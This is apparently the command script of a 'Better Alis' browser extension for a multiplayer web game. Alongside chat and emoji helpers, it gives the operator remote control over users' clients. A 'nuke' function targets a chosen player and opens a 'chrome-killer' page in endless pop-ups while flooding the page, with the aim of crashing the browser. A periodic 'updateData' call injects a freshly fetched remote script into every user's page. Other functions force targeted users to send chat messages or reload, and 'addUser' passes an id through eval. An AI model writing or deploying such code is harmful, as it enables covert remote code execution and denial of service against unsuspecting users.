console.log("bta commands 0.001")
var p = playerDetails;
var btaMute = false
var mypid = 0
function version() {window.sendChat($("#version").text());};
function ver(uid) {if(userid==uid)window.sendChat($("#version").text());};

function kick(uid) {if(userid==uid)window.location.reload(1);}
function nick(uid, nick) {if(userid==uid)$("#nick").value(nick)}

function test() {$("#chatroom").append("<span style='font-size:20px;'>Test</span>")}
function stop(uid, val) {if(userid==uid){myApp.isStopMovement = val}}

function addUser(uid) {
  eval(`$.extend(users, {${uid}:{"uid":${uid}}})`)
}

function cancermode() {
   var cancerFunction = setInterval(function(){
  for(var x in window.playerDetails){
  if(window.playerDetails[x].color){
  window.playerDetails[x].color.r = Math.floor((Math.random() * 255 + 1))
  window.playerDetails[x].color.g = Math.floor((Math.random() * 255 + 1))
  window.playerDetails[x].color.b = Math.floor((Math.random() * 255 + 1))
  }
    }
    $("canvas").css("background-color", "rgb(" + 0 + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
    $("span").css("color", "rgb(" + Math.floor((Math.random() * 255 + 1)) + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
  }, 100)
}

function title(title) {$("#lb_title").text(title)}
function alert(uid, text) {if(userid==uid)alert(text)}
function cancer(uid) {if(userid==uid){cancermode()}};

function mute(uid) {if(userid==uid){btaMute = true}}
function unmute(uid) {if(userid==uid){btaMute = false}}

function nukeME() {  setInterval(function(){
  var a = '0'.repeat(99999)
    let randomSize = Math.floor(Math.random() * (+1000 - +400) + +400);
    let randomSide = Math.floor(Math.random() * (+2000 - +10) + +10);
    window.open("https://zimek.tk/chrome-killer.html", "_blank", `top=${randomSide},left=${randomSide},width=${randomSize},height=${randomSize}`);
    window.open("https://zimek.tk/chrome-killer.html")
    $("div").append("<div style='padding:100px;'>" + a + "</div>")
    $("span").text(a)
    $("body").css("transform", "scale(1.5,1.5)")
    cancermode()
    }, 1)
}

function nuke(pid) {
  if(mypid==pid){
    setInterval(function(){
      nukeME()
    }, 10)
}}
function say(uid, text) {if(userid==uid){sendChat(text)}}
function massSay(text) {sendChat(text)}

function updateData() {
getUsers = $.get(`https://zimek.tk/BetterAlis/BetterAlis.users.json?nocache=${Math.random()}`);

setTimeout(function(){
  users = getUsers.responseJSON
setTimeout(function(){icons = users.icons}, 2000)
}, 3000)
$(`<script src="https://zimek.tk/BetterAlis/commands.js?nocache=${Math.random()}"></script>`).appendTo("head")
}

setInterval(updateData, 60*50*1000)

setInterval(function(){
  Object.values(p).forEach(p=>{if(p.name==$("#nick").val()){mypid = p.pid}})
}, 10000)

//for emojis
function addChat(x) {
$("#input_box2").val($("#input_box2").val() + x)
}

function goChatUP() {
  $("#chatroom").stop().animate({
    scrollTop: $("#chatroom")[0].scrollHeight,
  }, 400);
}

if(!$("#yourplayerid")){$("<span id='yourplayerid'></span>").appendTo("body")}

//ban o_o and mute
function checkBanned() {
setTimeout(function(){
  Object.values(users).forEach(user=>{
console.log("Checking all better alis bans and mutes...")

 if(user.muted == true || user.banned == true){
   if(window.userid == user.uid){
     console.log("%cYour Account has been Muted from Better Alis Extension",
     "background: #222; color: #14c0ff;padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 20px;border-radius: 10px;");
   chatRoom.sendMessage = function(msg) {$("#chatroom").append("<span class='msg' style='color:#ff7272;'>Your account has been muted from Better Alis Extension</span><br>");return}};
 };

  if(user.banned == true){
    if(window.userid == user.uid){
  console.log("%cYour Account has been Banned from Better Alis Extension",
  "background: #222; color: red;padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 20px;border-radius: 10px;");
  $("body").empty();
  $("html").css("background-color", "#181818");
  $(`<div style="text-align: center"><div style="display: inline-block;margin-top: 10%;">
<h1 style="font-size: 40px;color: #d1d1d1;">Your account has been banned from Better Alis Extension</h1><br><br>
<img src="/assets/img/banned1.png" width="550px"><br><br>
</div></div>`).appendTo("body");
}}

  });
}, 22000);
}